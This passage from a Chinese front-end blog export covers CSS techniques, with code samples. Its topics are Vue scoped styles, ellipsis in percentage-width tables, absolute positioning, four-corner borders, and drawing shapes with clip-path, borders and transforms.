<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
  <span class="token selector">.foo</span> <span class="token punctuation">&#123;</span>
    <span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- component A --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>A<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span>
    <span class="token comment">&lt;!-- 我们想让B中的字只在A中是蓝色，发现并没有效果 --></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
  <span class="token keyword">import</span> <span class="token constant">B</span> <span class="token keyword">from</span> <span class="token string">"@/component/B.vue"</span><span class="token punctuation">;</span>
  <span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">&#123;</span>
    name<span class="token operator">:</span> <span class="token string">"A"</span><span class="token punctuation">,</span>
    components<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      <span class="token constant">B</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">scoped</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
  <span class="token selector">.foo</span> <span class="token punctuation">&#123;</span>
    <span class="token property">color</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>打开开发者工具，我们发现，使用了 scoped 属性后，A 组件中所有的 html 标签都会加上一个类似 data-v-039c5b43 的属性，A 中引用的 B 组件根 div 标签也加上了这样一个 data-v 的属性，但是 B 组件内部的标签并没有被加上。也就是说，scoped 属性只对当前页面直接使用的标签生效。因此，我们想要修改的.foo 类应该是” .B[data-v-039c5b43] .foo “，而使用了 scoped 属性我们在 A 组件 css 中修改的类却是 “ .foo[data-v-039c5b43] “，这并不是我们想要修改的那个类，所以把字体变为蓝色并没有像我们想象中那样生效。</p>
<p>解决方案：</p>
<p>1.删除 A 组件 style 标签的 scoped 属性，就可以修改到全局的类</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- 去除scoped属性 --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
  <span class="token selector">.foo</span> <span class="token punctuation">&#123;</span>
    <span class="token property">color</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>2.保留 style 标签的 scoped 属性，重新引入一个全局的 css 样式文件来修改 B 组件的全局样式。（不可以在 style 标签中以@import 形式引入，这样还是受到 scoped 属性影响，应该在 script 标签中直接 import）</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token comment">/* global.css */</span>
<span class="token selector">.A .foo</span> <span class="token punctuation">&#123;</span>
  <span class="token property">color</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- component A --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>A<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span>
    <span class="token comment">&lt;!-- 我们想让B中的字只在A中是蓝色，发现并没有效果 --></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
  <span class="token keyword">import</span> <span class="token string">"global.css"</span><span class="token punctuation">;</span>
  <span class="token keyword">import</span> <span class="token constant">B</span> <span class="token keyword">from</span> <span class="token string">"@/component/B.vue"</span><span class="token punctuation">;</span>
  <span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">&#123;</span>
    name<span class="token operator">:</span> <span class="token string">"A"</span><span class="token punctuation">,</span>
    components<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      <span class="token constant">B</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">scoped</span><span class="token punctuation">></span></span><span class="token style"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>结论：对全局 css 样式的修改应该在全局中实现，若只要在局部修改全局 css 样式，不应该通过 scoped 属性实现，而应该在全局中用多级 css 类来限制作用范围。</p>
<p>参考链接<a href="https://www.jianshu.com/p/f9a8b7784655">https://www.jianshu.com/p/f9a8b7784655</a>;</p>
]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>scoped css</tag>
      </tags>
  </entry>
  <entry>
    <title>css百分比表格宽度超出文本省略</title>
    <url>/2018/11/09/css%E7%99%BE%E5%88%86%E6%AF%94%E8%A1%A8%E6%A0%BC%E5%AE%BD%E5%BA%A6%E8%B6%85%E5%87%BA%E6%96%87%E6%9C%AC%E7%9C%81%E7%95%A5/</url>
    <content><![CDATA[<h1 id="文本超出宽度后不换行，隐藏后显示省略号"><a href="#文本超出宽度后不换行，隐藏后显示省略号" class="headerlink" title="文本超出宽度后不换行，隐藏后显示省略号"></a>文本超出宽度后不换行，隐藏后显示省略号</h1><p>这是众所周知的三行代码</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">td</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">/* 文本不换行 */</span>
    <span class="token property">white-space</span><span class="token punctuation">:</span> nowrap<span class="token punctuation">;</span>
    <span class="token comment">/* 超出大小隐藏 */</span>
    <span class="token property">overflow</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>
    <span class="token comment">/* 文本超出显示省略号 */</span>
    <span class="token property">text-overflow</span><span class="token punctuation">:</span> ellipsis<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="表格百分比宽度时无效"><a href="#表格百分比宽度时无效" class="headerlink" title="表格百分比宽度时无效"></a>表格百分比宽度时无效</h2><p>但是当表格td宽度设为百分比时，这三行代码并没有生效，表格还是被撑开了。当表格宽度使用像素px时，这三行代码又可以生效，如何解决这个问题呢？</p>
<p>在表格table上加一个样式，table-layout: fixed就可以解决了。</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">table</span> <span class="token punctuation">&#123;</span>
    <span class="token property">table-layout</span><span class="token punctuation">:</span> fixed<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>table-layout设定为fixed将自动表格布局算法变为了固定表格布局算法，此时布局渲染更快，表格布局只与设定的宽度与间距有关，与内容无关。自动表格布局刚好相反。</p>
<blockquote>
<p>参考链接<br><a href="https://blog.csdn.net/Altaba/article/details/55805586">https://blog.csdn.net/Altaba/article/details/55805586</a></p>
</blockquote>
]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
        <tag>table</tag>
        <tag>td百分比</tag>
        <tag>超出文本不换行省略</tag>
      </tags>
  </entry>
  <entry>
    <title>css子元素根据父元素绝对定位</title>
    <url>/2018/10/21/css%E5%AD%90%E5%85%83%E7%B4%A0%E6%A0%B9%E6%8D%AE%E7%88%B6%E5%85%83%E7%B4%A0%E7%BB%9D%E5%AF%B9%E5%AE%9A%E4%BD%8D/</url>
    <content><![CDATA[<p>CSS中子元素position: absolute，会根据父元素定位，若父元素未指定position，父元素position则默认为static，子元素继续向上查找父元素position，以第一个找到position为非static的父级元素为绝对定位的基准，若直到body都没有找到position为非static的父级元素，则以body为绝对定位的基准。</p>
<p>结论：若要子元素根据父元素绝对定位，除了子元素的position设置为absolute以外，还要将父元素的position改为relative。</p>
]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
        <tag>绝对定位</tag>
        <tag>子元素</tag>
      </tags>
  </entry>
  <entry>
    <title>css扇形画法</title>
    <url>/2021/07/15/css%E6%89%87%E5%BD%A2%E7%94%BB%E6%B3%95/</url>
    <content><![CDATA[<p>有很多扇形的实现方式，大部分是通过边框、遮罩等方式实现的，需要用到多个 div，这涉及到多个层级，且因为是遮罩，无法实现半透明等效果。下面讲一种使用<code>clip-path</code>属性实现扇形的方法。</p>
<h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><ul>
<li>绘制一个正方形 div;</li>
<li>使用 <code>clip-path</code> 属性的 <code>polygon</code> 方法裁剪要显示的区域;<ul>
<li><code>polygon</code>方法以 div 中心**50% 50%<strong>为起点，左上角原点</strong>0% 0%**为不动点，将第三点从左上角原点开始沿四条边移动，绘制要裁剪的区域;</li>
<li>div 顶边代表 0-90 度角的扇形（比率中的 0-25%），此时只需要中心起点、左上角原点、沿顶边动态变化的点，三个点，即可绘出要裁剪的三角形;</li>
</ul>
</li>
<li>使用 <code>border-radius</code> 属性将正方形 div 变为圆形;</li>
<li>将该 div 旋转 45 度;</li>
</ul>
]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
        <tag>扇形</tag>
      </tags>
  </entry>
  <entry>
    <title>css实现四角边框</title>
    <url>/2018/11/09/css%E5%AE%9E%E7%8E%B0%E5%9B%9B%E8%A7%92%E8%BE%B9%E6%A1%86/</url>
    <content><![CDATA[<h1 id="css实现四角边框"><a href="#css实现四角边框" class="headerlink" title="css实现四角边框"></a>css实现四角边框</h1><p><img src="/images/border.svg" alt="border"></p>
<p>如何实现上图这种四角的边框？</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>main<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.main</span> <span class="token punctuation">&#123;</span>
    <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token selector">.main span:nth-child(1)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">/* 绝对定位 */</span>
    <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
    <span class="token comment">/* 将span撑开 */</span>
    <span class="token property">padding</span><span class="token punctuation">:</span> 6px 6.5px<span class="token punctuation">;</span>
    <span class="token comment">/* 边框宽度，左上角只显示左边框和上边框 */</span>
    <span class="token property">border-width</span><span class="token punctuation">:</span> 3px 0 0 3px<span class="token punctuation">;</span>
    <span class="token property">border-style</span><span class="token punctuation">:</span> solid<span class="token punctuation">;</span>
    <span class="token property">border-color</span><span class="token punctuation">:</span> #4ab2f8<span class="token punctuation">;</span>
    <span class="token comment">/* 定位到左上角，并使边框离main有一定间距 */</span>
    <span class="token property">left</span><span class="token punctuation">:</span> -5px<span class="token punctuation">;</span>
    <span class="token property">top</span><span class="token punctuation">:</span> -5px<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token selector">.main span:nth-child(2)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">/* 绝对定位 */</span>
    <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
    <span class="token comment">/* 将span撑开 */</span>
    <span class="token property">padding</span><span class="token punctuation">:</span> 6px 6.5px<span class="token punctuation">;</span>
    <span class="token comment">/* 边框宽度，右上角只显示右边框和上边框 */</span>
    <span class="token property">border-width</span><span class="token punctuation">:</span> 3px 3px 0 0<span class="token punctuation">;</span>
    <span class="token property">border-style</span><span class="token punctuation">:</span> solid<span class="token punctuation">;</span>
    <span class="token property">border-color</span><span class="token punctuation">:</span> #4ab2f8<span class="token punctuation">;</span>
    <span class="token comment">/* 定位到右上角，并使边框离main有一定间距 */</span>
    <span class="token property">right</span><span class="token punctuation">:</span> -5px<span class="token punctuation">;</span>
    <span class="token property">top</span><span class="token punctuation">:</span> -5px<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token selector">.main span:nth-child(3)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">/* 绝对定位 */</span>
    <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
    <span class="token comment">/* 将span撑开 */</span>
    <span class="token property">padding</span><span class="token punctuation">:</span> 6px 6.5px<span class="token punctuation">;</span>
    <span class="token comment">/* 边框宽度，左下角只显示左边框和下边框 */</span>
    <span class="token property">border-width</span><span class="token punctuation">:</span> 0 0 3px 3px<span class="token punctuation">;</span>
    <span class="token property">border-style</span><span class="token punctuation">:</span> solid<span class="token punctuation">;</span>
    <span class="token property">border-color</span><span class="token punctuation">:</span> #4ab2f8<span class="token punctuation">;</span>
    <span class="token comment">/* 定位到左下角，并使边框离main有一定间距 */</span>
    <span class="token property">left</span><span class="token punctuation">:</span> -5px<span class="token punctuation">;</span>
    <span class="token property">bottom</span><span class="token punctuation">:</span> -5px<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token selector">.main span:nth-child(4)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">/* 绝对定位 */</span>
    <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
    <span class="token comment">/* 将span撑开 */</span>
    <span class="token property">padding</span><span class="token punctuation">:</span> 6px 6.5px<span class="token punctuation">;</span>
    <span class="token comment">/* 边框宽度，右下角只显示右边框和下边框 */</span>
    <span class="token property">border-width</span><span class="token punctuation">:</span> 0 3px 3px 0<span class="token punctuation">;</span>
    <span class="token property">border-style</span><span class="token punctuation">:</span> solid<span class="token punctuation">;</span>
    <span class="token property">border-color</span><span class="token punctuation">:</span> #4ab2f8<span class="token punctuation">;</span>
    <span class="token comment">/* 定位到右下角，并使边框离main有一定间距 */</span>
    <span class="token property">right</span><span class="token punctuation">:</span> -5px<span class="token punctuation">;</span>
    <span class="token property">bottom</span><span class="token punctuation">:</span> -5px<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>参考链接<br><a href="https://www.jb51.net/css/581071.html">https://www.jb51.net/css/581071.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
        <tag>四角边框</tag>
      </tags>
  </entry>
  <entry>
    <title>css绘制多种形状</title>
    <url>/2019/06/12/css%E7%BB%98%E5%88%B6%E5%A4%9A%E7%A7%8D%E5%BD%A2%E7%8A%B6/</url>
    <content><![CDATA[<p>CSS上古时代连圆形都要靠切图，到了CSS3之后，我们已经可以使用各种方法绘制不同的形状了</p>
<h2 id="圆形"><a href="#圆形" class="headerlink" title="圆形"></a>圆形</h2><p>通常我们都是依靠设置宽高相同的盒，再设置border-radius为50%来绘制圆形</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.circle</span> <span class="token punctuation">&#123;</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
  <span class="token property">border-radius</span><span class="token punctuation">:</span> 50%<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<span id="more"></span>

<p>现在，我们也可以用强大的clip-path的circle方法来绘制，circle( [&lt;shape-radius&gt;]? [at &lt;position&gt;] )，其中shape-radius是半径，当使用百分比半径的时候将会以sqrt(width^2+height^2)/sqrt(2)为100%来计算，position定义了圆心到盒上边与左边的距离，默认值为盒中心。</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.circle</span> <span class="token punctuation">&#123;</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
  <span class="token comment">/* 所有参数示例 */</span>
  <span class="token property">clip-path</span><span class="token punctuation">:</span> <span class="token function">circle</span><span class="token punctuation">(</span>40px at 50px 40px<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">/* 实现同border-radius一致效果的示例 */</span>
  <span class="token property">clip-path</span><span class="token punctuation">:</span> <span class="token function">circle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="椭圆形"><a href="#椭圆形" class="headerlink" title="椭圆形"></a>椭圆形</h2><p>clip-path绘制椭圆形，ellipse( [&lt;shape-radius&gt;{2}]? [at &lt;position&gt;] )，shape-radius为椭圆形x轴与y轴半径，默认为100%，position是椭圆中心点，默认为盒中心点。</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.ellipse</span> <span class="token punctuation">&#123;</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 50px<span class="token punctuation">;</span>
  <span class="token property">clip-path</span><span class="token punctuation">:</span> <span class="token function">ellipse</span><span class="token punctuation">(</span>50% 30% at 50% 35%<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="三角形"><a href="#三角形" class="headerlink" title="三角形"></a>三角形</h2><p>使用border属性，我们可以绘制出三角形，与梯形，这种方法的缺点是只绘出了形状，并没有改变盒模型的边界</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.triangle</span> <span class="token punctuation">&#123;</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
  <span class="token comment">/* 未设置顶部边框则宽为0，左右两侧边框宽度为div宽度的一半，透明色，底边框高度为div高度，使用背景色，三个边框形成的区域就是三角形 */</span>
  <span class="token property">border-left</span><span class="token punctuation">:</span> 50px solid transparent<span class="token punctuation">;</span>
  <span class="token property">border-right</span><span class="token punctuation">:</span> 50px solid transparent<span class="token punctuation">;</span>
  <span class="token property">border-bottom</span><span class="token punctuation">:</span> 100px solid orange<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token selector">.trapezoid</span> <span class="token punctuation">&#123;</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
  <span class="token comment">/* 减小两侧边框宽度，使之形成梯形 */</span>
  <span class="token property">border-left</span><span class="token punctuation">:</span> 30px solid transparent<span class="token punctuation">;</span>
  <span class="token property">border-right</span><span class="token punctuation">:</span> 30px solid transparent<span class="token punctuation">;</span>
  <span class="token property">border-bottom</span><span class="token punctuation">:</span> 100px solid orange<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="平行四边形"><a href="#平行四边形" class="headerlink" title="平行四边形"></a>平行四边形</h2><p>绘制平行四边形，我们第一个想到的方法就是使用transform的skew，但是skew有一个很大的缺点就是连盒内部的文字也变形了，如何解决文字变形的问题呢？我们可以使用CSS的伪元素，在伪元素上使用skew变形，而不改变元素本身。</p>
<p>skew( ax [, ay] )，ax与ay是角的大小，ax指x轴（纵轴，不同与平面直接直角坐标系的x轴）在逆时针方向上扭曲的程度，ay指y轴在顺时针方向上扭曲的程度。角的大小可以用度deg，百分度grad，弧度rad，圈数turn来表示。</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token comment">/* 设置z-index为1，防止伪元素遮挡 */</span>
<span class="token selector">.parallelogram</span> <span class="token punctuation">&#123;</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 150px<span class="token punctuation">;</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 36px<span class="token punctuation">;</span>
  <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>
  <span class="token property">cursor</span><span class="token punctuation">:</span> pointer<span class="token punctuation">;</span>
  <span class="token property">font-size</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>
  <span class="token property">color</span><span class="token punctuation">:</span> #fff<span class="token punctuation">;</span>
  <span class="token property">line-height</span><span class="token punctuation">:</span> 36px<span class="token punctuation">;</span>
  <span class="token property">z-index</span><span class="token punctuation">:</span> 1<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token selector">.parallelogram::before</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">/* 设置z-index为-1，不遮挡未设置z-index的元素 */</span>
  <span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">;</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 150px<span class="token punctuation">;</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 36px<span class="token punctuation">;</span>
  <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
  <span class="token property">top</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
  <span class="token property">left</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
  <span class="token property">background</span><span class="token punctuation">:</span> #00699f<span class="token punctuation">;</span>
  <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">skew</span><span class="token punctuation">(</span>-45deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">z-index</span><span class="token punctuation">:</span> -1<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="梯形"><a href="#梯形" class="headerlink" title="梯形"></a>梯形</h2><p>梯形用到了透视与3D变换的x轴旋转，若是要得到一个直角梯形，则还要改变变换原点的属性。</p>
<h3 id="一些变换的基础知识"><a href="#一些变换的基础知识" class="headerlink" title="一些变换的基础知识"></a>一些变换的基础知识</h3><p>scale( sx [, sy] ) 缩放函数，sx表示缩放向量横坐标，sy表示缩放向量纵坐标，若未设置sy，则默认值为sx，使得元素保持原有形状均等缩放。</p>
<p>perspective(length) 观察者与z=0平面的距离，用以产生透视效果，默认值为none。</p>
<p>rotateX(a) 绕x轴顺时针旋转大小，可以是角度、弧度、百分度、圈数。</p>
<p>transform-origin 变换原点，可以是一个值、两个值或三个值，第一个值代表水平偏移量，第二个值表示垂直偏移量</p>
<ul>
<li>一个值：<ul>
<li>必须是长度、百分比或left,center,right,top,bottom关键字中的一个。</li>
</ul>
</li>
<li>两个值：<ul>
<li>其中一个必须是长度，百分比或left,center,right关键字中的一个。</li>
<li>另一个必须是长度，百分比或top,center,bottom关键字中的一个。</li>
</ul>
</li>
<li>三个值：<ul>
<li>前两个值同只有两个值的用法。</li>
<li>第三个值必须是长度。它始终代表Z轴偏移量。</li>
</ul>
</li>
</ul>
<h3 id="梯形与直角梯形"><a href="#梯形与直角梯形" class="headerlink" title="梯形与直角梯形"></a>梯形与直角梯形</h3><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.trapezoid</span> <span class="token punctuation">&#123;</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 170px<span class="token punctuation">;</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 36px<span class="token punctuation">;</span>
  <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>
  <span class="token property">cursor</span><span class="token punctuation">:</span> pointer<span class="token punctuation">;</span>
  <span class="token property">font-size</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>
  <span class="token property">color</span><span class="token punctuation">:</span> #fff<span class="token punctuation">;</span>
  <span class="token property">line-height</span><span class="token punctuation">:</span> 36px<span class="token punctuation">;</span>
  <span class="token property">z-index</span><span class="token punctuation">:</span> 1<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token selector">.trapezoid::before</span> <span class="token punctuation">&#123;</span>
  <span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">;</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 170px<span class="token punctuation">;</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 36px<span class="token punctuation">;</span>
  <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
  <span class="token property">top</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
  <span class="token property">left</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
  <span class="token property">background</span><span class="token punctuation">:</span> #00699f<span class="token punctuation">;</span>
  <span class="token comment">/* 通过沿x轴旋转并改变观察点与z平面距离形成梯形，通过缩放使变换后的梯形达到原来的高度 */</span>
  <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">scale</span><span class="token punctuation">(</span>1.1 1.79<span class="token punctuation">)</span> <span class="token function">perspective</span><span class="token punctuation">(</span>100px<span class="token punctuation">)</span> <span class="token function">rotateX</span><span class="token punctuation">(</span>45deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">/* 通过改变变换原点为右下方，使梯形成为直角梯形 */</span>
  <span class="token property">transform-origin</span><span class="token punctuation">:</span> bottom right<span class="token punctuation">;</span>
